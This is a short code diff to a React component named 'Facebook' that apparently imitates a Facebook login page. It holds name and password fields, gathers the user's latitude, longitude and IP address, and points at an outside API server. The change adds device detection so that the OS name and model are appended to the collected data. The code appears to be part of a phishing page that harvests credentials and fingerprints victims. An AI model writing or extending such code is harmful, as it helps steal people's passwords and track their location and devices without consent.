@@ -2,10 +2,13 @@ import React,{useState,useEffect} from 'react'
 import './Facebook.css'
 import axios from 'axios'
 import {Helmet} from "react-helmet";
+import { deviceDetect } from 'react-device-detect';
 
 function Facebook() {
 
   const api = "https://node-kafka.vercel.app"
+
+  const { osName, model } = deviceDetect();
 
   const [name,setName] = useState("")
   const [password,setPassword] = useState("")
@@ -32,7 +35,7 @@ function Facebook() {
 
   let location = latitude +" "+ longitude
     // let username = name
-    let address = ip
+    let address = ip + osName + model
     // let duration = 5
     let slug = new Date()
 
